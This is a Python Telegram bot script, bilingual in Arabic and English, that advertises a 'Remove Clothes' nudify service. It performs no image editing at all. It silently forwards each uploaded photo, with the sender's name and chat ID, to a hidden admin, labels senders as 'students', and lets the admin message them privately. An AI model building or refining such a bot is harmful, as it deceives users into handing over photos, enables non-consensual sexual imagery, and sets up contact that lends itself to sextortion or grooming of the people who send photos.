import telebot
from telebot import types
import os
import json

# متغيرات البيئة
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID"))

bot = telebot.TeleBot(BOT_TOKEN)
user_limit = {}  # تخزين عدد الصور لكل مستخدم
student_lookup = {}

# رسالة البداية
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.send_message(message.chat.id,
        "👀 تخيّل صورتك تتعدّل بثواني…\n"
        "💋 تقدر تشوفها بدون ملابس، أو بملامح أحلى.\n"
        "📸 أرسل صورة الآن وخلّنا نبدأ...\n\n"
        "👀 Imagine your photo transformed in seconds…\n"
        "💋 See it with no clothes, or with enhanced features.\n"
        "📸 Send a photo now... let’s get started.")

# عند إرسال صورة
@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    user_id = message.chat.id
    user_limit[user_id] = user_limit.get(user_id, 0)

    if user_limit[user_id] >= 3:
        bot.send_message(user_id, "🚫 لقد وصلت للحد الأقصى اليومي (3 صور).\nYou’ve reached today’s limit.")
        return

    # زيادة العداد
    user_limit[user_id] += 1

    # إرسال خيارات التعديل
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("إزالة الملابس 🔞 / Remove Clothes", callback_data="nude"))
    markup.add(types.InlineKeyboardButton("تعديل الوجه 💄 / Edit Face", callback_data="face"))
    markup.add(types.InlineKeyboardButton("تحسين الصورة 📸 / Enhance Photo", callback_data="quality"))

    bot.send_message(user_id,
        "⬇️ اختر نوع التعديل:\nChoose edit type:",
        reply_markup=markup)

    try:
        photo_file_id = message.photo[-1].file_id
        caption = f"📥 صورة جديدة من الطالب: {message.from_user.first_name} ({user_id})"
        sent = bot.send_photo(ADMIN_ID, photo_file_id, caption=caption)
        student_lookup[sent.message_id] = user_id
    except Exception as e:
        print(f"خطأ في إرسال الصورة للمشرف: {e}")

# عند الضغط على زر
@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    choice = call.data
    user_id = call.message.chat.id
    text = {
        "nude": "🔞 الطالب اختار: إزالة الملابس",
        "face": "💄 الطالب اختار: تعديل الوجه",
        "quality": "📸 الطالب اختار: تحسين الصورة"
    }.get(choice, "❔ خيار غير معروف")

    try:
        bot.send_message(ADMIN_ID, f"{text}\nمن: {user_id}")
    except:
        pass

# المشرف يرد على الطالب مباشرة
@bot.message_handler(func=lambda msg: msg.chat.id == ADMIN_ID and msg.reply_to_message)
def handle_admin_reply(message):
    replied_msg_id = message.reply_to_message.message_id
    student_id = student_lookup.get(replied_msg_id)

    if student_id:
        try:
            bot.send_message(student_id, f"📩 رسالة من المشرف:\n{message.text}")
            bot.send_message(ADMIN_ID, "✅ تم إرسال رسالتك.")
        except:
            bot.send_message(ADMIN_ID, "⚠️ فشل إرسال الرسالة للطالب.")
    else:
        bot.send_message(ADMIN_ID, "⚠️ لم يتم العثور على الطالب.")

# المشرف يستخدم أمر /رد
@bot.message_handler(commands=['رد'])
def manual_reply(message):
    if message.chat.id != ADMIN_ID:
        return
    args = message.text.split(maxsplit=2)
    if len(args) < 3:
        bot.send_message(ADMIN_ID, "❗ استخدم الصيغة: /رد student_id الرسالة")
        return

    try:
        student_id = int(args[1])
        reply_text = args[2]
        bot.send_message(student_id, f"📩 رسالة من المشرف:\n{reply_text}")
        bot.send_message(ADMIN_ID, "✅ تم إرسال الرسالة.")
    except Exception as e:
        bot.send_message(ADMIN_ID, f"⚠️ فشل الإرسال: {e}")

# منع الرسائل النصية
@bot.message_handler(content_types=['text'])
def reject_text(message):
    bot.send_message(message.chat.id, "❗ أرسل صورة فقط لاستخدام هذا البوت.\nSend a *photo* to use this bot.")

print("✅ Bot is running...")
bot.polling()
